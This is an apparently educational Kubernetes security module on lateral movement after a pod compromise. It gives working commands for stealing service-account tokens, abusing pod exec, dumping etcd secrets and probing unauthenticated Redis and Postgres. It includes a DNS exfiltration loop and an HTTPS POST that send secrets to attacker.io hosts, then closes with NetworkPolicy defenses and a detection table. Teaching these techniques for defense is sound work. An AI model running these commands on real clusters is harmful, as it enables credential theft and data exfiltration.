# Lateral Movement & Data Exfiltration

> **Module 04 · Course 38** — You have one pod. The valuable data is in another namespace. This module covers how attackers move through a Kubernetes cluster after their initial foothold — and the two channels they use to get data out.

---

## Why K8s Makes Lateral Movement Easy

Traditional network segmentation: each VM on its own subnet, firewalls between everything. Kubernetes default network model:

```
Pod A (namespace: frontend)  ←──── can reach ────►  Pod B (namespace: backend)
Pod B (namespace: backend)   ←──── can reach ────►  Pod C (namespace: database)
Pod A (namespace: frontend)  ←──── can reach ────►  Pod C (namespace: database)
```

**By default, there are no network boundaries between namespaces.** Every pod can reach every other pod by IP address. Kubernetes namespaces are an RBAC concept, not a network isolation concept. Without NetworkPolicy, the cluster is one flat Layer 3 network.

The other thing that makes lateral movement easy: **ServiceAccount tokens are mounted in every pod.** Even if an attacker can't reach the API server directly, they have credentials to try.

---

## The Lateral Movement Chain

```
Compromised frontend pod
        │
        │  1. Read SA token from /var/run/secrets/
        │  2. Query: kubectl auth can-i --list
        ▼
Can list pods in backend namespace?
        │                           │
      YES                          NO
        │                           │
        ▼                           ▼
exec into backend pod         Find other tokens
read its SA token             in env vars / mounts
        │
        ▼
backend token has list secrets?
        │                           │
      YES                          NO
        │                           │
        ▼                           ▼
kubectl get secrets -n database   Try kubelet API
read database credentials         on the node (port 10250)
        │
        ▼
Database credentials → dump data
        │
        ▼
Exfiltrate via DNS or HTTPS
```

Each step expands the blast radius. An attacker with one pod can often reach the entire cluster within minutes.

---

## Namespace Hopping

Kubernetes namespaces partition resources — but a SA token from one namespace can call the K8s API for other namespaces if the RBAC permissions allow it.

```bash
# Inside your compromised frontend pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Check: can this token see resources in other namespaces?
curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces \
  -o /dev/null -w "%{http_code}"
# 200 → you can list namespaces (broader access than expected)
# 403 → forbidden (normal)

# Try listing pods in specific namespaces:
for ns in default kube-system production staging backend database; do
  code=$(curl -s --cacert $CA \
    -H "Authorization: Bearer $TOKEN" \
    https://kubernetes.default/api/v1/namespaces/$ns/pods \
    -o /dev/null -w "%{http_code}")
  echo "$ns: $code"
done
# production: 200  ← This namespace is reachable!

# List pods in production namespace:
curl -s --cacert $CA \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces/production/pods \
  -o - | python3 -c "
import sys,json
pods = json.load(sys.stdin)
for p in pods['items']:
    print(p['metadata']['name'])
"
```

The discovery: a ClusterRole was bound to this SA that grants read access to pods cluster-wide (a common misconfiguration when granting monitoring access).

---

## Token Reuse Attack

The most effective lateral movement technique: steal a SA token from a pod with higher privileges, then use it from your attack pod.

```bash
# Step 1: You can exec into a production pod (you have that RBAC).
# Find a pod whose SA might have secrets access:
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces/production/pods \
  | python3 -c "
import sys,json
pods=json.load(sys.stdin)
for p in pods['items']:
    sa = p['spec'].get('serviceAccountName','default')
    print(p['metadata']['name'], '→', sa)
"
# Output:
# api-server-7f8b9c → api-serviceaccount
# scheduler-6d5c4b → scheduler-sa
# vault-agent-9e1f2 → vault-sa        ← interesting!

# Step 2: exec into the vault-agent pod and read its token:
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://kubernetes.default/api/v1/namespaces/production/pods/vault-agent-9e1f2/exec \
  '?command=cat&arg=/var/run/secrets/kubernetes.io/serviceaccount/token&stdout=true'
# This returns the vault-sa's token

# Step 3: Use the stolen token to access secrets:
VAULT_SA_TOKEN="<stolen token>"
curl -s --cacert $CA \
  -H "Authorization: Bearer $VAULT_SA_TOKEN" \
  https://kubernetes.default/api/v1/namespaces/production/secrets
# → Returns all secrets in production namespace
```

The key insight: if you can exec into a pod, you can steal its SA token. The exec permission is what matters — the target pod's SA permissions are what you're after.

---

## Service Trust Exploitation

Many backend services trust callers based on:
- IP address (from the same pod CIDR → trusted)
- Namespace label (a service mesh mutual TLS policy based on namespace, not workload identity)
- No auth at all (internal services assume network = security)

```bash
# From your compromised frontend pod, probe internal services:
# Services use DNS: <name>.<namespace>.svc.cluster.local

# Check if the backend API has auth:
curl -s http://backend-api.backend.svc.cluster.local/api/users
# Returns user data with no auth check
# → "It's internal, no one can reach it from outside the cluster"
# (Until someone gets inside the cluster)

# Probe a database service:
# PostgreSQL default port:
nc -zv postgres.database.svc.cluster.local 5432
# If open, try default credentials:
PGPASSWORD=password psql -h postgres.database.svc.cluster.local \
  -U postgres -c "SELECT version();"

# Redis with no auth:
redis-cli -h redis.cache.svc.cluster.local ping
# PONG → no auth
redis-cli -h redis.cache.svc.cluster.local keys '*'
# → All cache keys (may contain session tokens, PII, etc.)
```

---

## etcd: The Crown Jewel

etcd is the K8s backing store. It stores every Secret, ConfigMap, pod spec, and service in the cluster — including SA tokens, TLS certificates, and application secrets. Kubernetes encrypts secrets in etcd *at rest* only if `--encryption-provider-config` is configured. Most clusters don't have this.

```bash
# If etcd port 2379 is reachable from inside the cluster:
# (It shouldn't be, but misconfigured clusters expose it to the pod CIDR)

# Check if etcd is reachable:
nc -zv 10.0.0.1 2379  # Replace with actual etcd endpoint

# If reachable, use etcdctl to dump all secrets:
# (etcdctl binary or use the one on the control-plane node)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only \
  | grep secret

# Dump a specific secret (raw bytes, base64 encoded in the value):
ETCDCTL_API=3 etcdctl \
  --endpoints=https://10.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/production/database-creds
```

If etcd is reachable with the cert files (which live on the control-plane node's filesystem), every secret in the cluster is compromised. This is why etcd must never be reachable from pods.

---

## DNS-Based Data Exfiltration

NetworkPolicy blocks pod-to-pod TCP/UDP. But DNS (UDP port 53 to CoreDNS) is almost never blocked — because blocking DNS breaks everything.

An attacker can encode stolen data in DNS lookup hostnames and have an external DNS server they control receive those queries.

```
Inside cluster                     Internet
─────────────────────              ───────────────────
Stolen secret:                     Attacker's DNS server
"db_password=s3cr3t!"              controls: exfil.attacker.io
         │
         │  base64 encode
         ▼
"ZGJfcGFzc3dvcmQ9czNjcjN0IQ=="
         │
         │  split into 60-char chunks (DNS label limit: 63 chars)
         ▼
"ZGJfcGFzc3dvcmQ9czNjcjN0IQ" → first chunk
         │
         │  lookup: ZGJfcGFzc3dvcmQ9czNjcjN0IQ.exfil.attacker.io
         ▼
DNS query leaves the cluster via CoreDNS → upstream DNS resolver → attacker's server
Attacker's server logs: "ZGJfcGFzc3dvcmQ9czNjcjN0IQ.exfil.attacker.io"
         │
         │  base64 decode
         ▼
"db_password=s3cr3t!"
```

```bash
# DNS exfiltration in one line:
# (Encodes a secret and sends it as DNS lookups)
SECRET="db_password=s3cr3t!"
ENCODED=$(printf '%s' "$SECRET" | base64 | tr -d '\n')
DOMAIN="exfil.attacker.io"

# Split into 60-char chunks and send each as a DNS query:
i=0
while [ ${#ENCODED} -gt 0 ]; do
  CHUNK="${ENCODED:0:60}"
  ENCODED="${ENCODED:60}"
  nslookup "${i}.${CHUNK}.${DOMAIN}" > /dev/null 2>&1
  i=$((i+1))
done
# → Attacker's DNS server receives all chunks in order
```

Why this bypasses NetworkPolicy: a standard `deny all egress` policy usually still allows DNS to CoreDNS (required for name resolution). CoreDNS then forwards external queries upstream. The malicious DNS queries exit through that allowed path.

The fix: use `dnsPolicy: None` + a custom DNS config to prevent pods from querying external names, or use a DNS firewall (Cilium's DNS policy, or CoreDNS with a denylist plugin).

---

## HTTPS Exfiltration

If egress to port 443 is allowed (common because most apps need to call external APIs), data can be exfiltrated over HTTPS:

```bash
# Collect sensitive data:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
SECRETS=$(kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}: {.data}{"\n"}{end}' 2>/dev/null)

# Exfiltrate via HTTPS POST:
curl -s -X POST https://attacker.io/collect \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"$TOKEN\", \"secrets\": \"$(echo "$SECRETS" | base64 | tr -d '\n')\"}"

# Check if egress port 443 is blocked:
curl -sf --max-time 5 https://8.8.8.8 -o /dev/null
echo "exit: $?"
# 0 → egress 443 open
# Non-0 → blocked
```

---

## The Full Blast Radius

```
Compromised frontend pod
         │
         ├──► SA token → list pods in production
         │                      │
         │              exec into vault-agent
         │                      │
         │              steal vault-sa token
         │                      │
         │              list all secrets
         │                      │
         │              database credentials
         │
         ├──► Flat network → reach backend directly
         │    Redis: no auth → session tokens for all users
         │    PostgreSQL: weak password → full database dump
         │
         ├──► hostPath node volume (if deployed) → node access
         │                      │
         │              /node/var/lib/kubelet/pods/*/secrets/
         │              → ALL SA tokens for ALL pods on the node
         │                      │
         │              → Lateral move to ANY namespace served by this node
         │
         └──► Cloud IMDS from pod → cloud IAM credentials (Module 05)
                                            │
                                   S3/GCS/Azure storage
                                   Other clusters (via kubeconfig in cloud secret)
                                   Other cloud services
```

One compromised pod → potentially the entire cluster and cloud account.

---

## Defense: NetworkPolicy to Contain Blast Radius

```yaml
# default-deny-all.yaml — apply to every namespace
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}      # Applies to ALL pods in namespace
  policyTypes:
  - Ingress
  - Egress
  # No rules = deny everything
---
# allow-specific-egress.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-required-egress
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api-server
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: database
    ports:
    - port: 5432
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - port: 53
      protocol: UDP
```

Apply default-deny to every namespace. Then explicitly allow only required traffic. This limits blast radius from a compromised pod to only what it's explicitly allowed to reach.

---

## Defense Table

| Attack technique | Detection | Prevention |
|-----------------|-----------|------------|
| Namespace hopping via SA token | Audit: list pods in multiple namespaces | RBAC: namespace-scoped roles, never ClusterRoles for app SAs |
| Token reuse from exec | Audit: exec events + subsequent API calls | OPA: deny exec on pods not owned by the caller |
| Internal service no-auth | — (network level) | Service mesh mTLS (Module 07); no unauthenticated internal endpoints |
| etcd direct access | Network log: connection to 2379 | Firewall etcd to control-plane nodes only; audit etcd TLS client certs |
| DNS exfiltration | CoreDNS query log anomalies | Cilium DNS policy; CoreDNS denylist for external resolution |
| HTTPS exfiltration | Network log: pod contacting external IP | Egress NetworkPolicy; allow-list external endpoints only |

---

## Checkpoint

You're ready for Module 05 when you can answer:

1. Why do Kubernetes namespaces NOT provide network isolation by default?
2. What is the K8s DNS pattern for reaching a service, and why does it expose all services to all pods?
3. If a SA token allows `list pods` cluster-wide, what would you do with it next?
4. What is the token reuse attack, and what RBAC permission makes it possible?
5. Why is etcd called the "crown jewel" — what does it store that makes it so dangerous?
6. How does DNS exfiltration bypass a default-deny NetworkPolicy?
7. What is the K8s API call an attacker uses to exec into a pod and steal its SA token?
8. A `default-deny-all` NetworkPolicy is applied. Can a pod still reach CoreDNS? Why or why not?
9. How would you detect a SA token being used from an unexpected source IP?

➡ Next: **Cloud IAM & Metadata Service Attacks** — from cluster to cloud, and how IMDS exposes the entire cloud account.
